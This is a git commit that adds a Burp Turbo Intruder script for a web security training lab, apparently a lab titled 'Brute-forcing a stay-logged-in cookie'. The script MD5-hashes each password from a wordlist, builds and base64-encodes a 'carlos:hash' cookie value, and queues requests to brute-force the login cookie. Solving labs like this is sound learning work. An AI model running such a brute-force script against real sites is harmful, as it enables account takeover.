77fcc905d97db0e970a69f6acdc4fe3e6dc208e6
0xRoqeeb <49154037+0xRoqeeb@users.noreply.github.com>
2024-10-01 07:24:51 +0100

    Create script.py

---
+++ authentication/Lab: Brute-forcing a stay-logged-in cookie/script.py
@@ -0,0 +1,25 @@
+from hashlib import md5
+import base64
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False)
+
+  
+    for word in open('C:/Users/user/Desktop/nn/authlabpass.txt'):
+        word = word.strip()
+        
+        hashed_pass = md5(word.encode()).hexdigest()
+        
+        payload = 'carlos:' + hashed_pass
+        encoded_payload = base64.b64encode(payload.encode()).decode()
+        
+
+        # Add request to the engine
+        engine.queue(target.req, encoded_payload)
+
+def handleResponse(req, interesting):
+    if interesting:
+        table.add(req)
